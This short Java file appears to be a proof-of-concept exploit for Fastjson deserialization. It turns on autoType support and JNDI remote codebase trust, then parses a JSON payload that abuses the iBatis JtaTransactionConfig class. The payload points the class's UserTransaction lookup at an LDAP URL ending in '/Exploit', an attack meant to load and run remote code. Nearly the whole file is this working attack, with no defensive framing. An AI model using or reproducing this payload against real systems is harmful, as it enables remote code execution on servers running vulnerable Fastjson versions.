package com.test.fastjson;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

/**
 * <dependency>
 *       <groupId>org.apache.ibatis</groupId>
 *       <artifactId>ibatis-sqlmap</artifactId>
 *       <version>2.3.4.726</version>
 * </dependency>
 * @Author:Wadewfsssss
 */

public class JtaTransactionConfig {

    public static void main(String[] args) {
        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

        String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:1389/Exploit\"}}";
        try {
            JSON.parseObject(payload);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
}
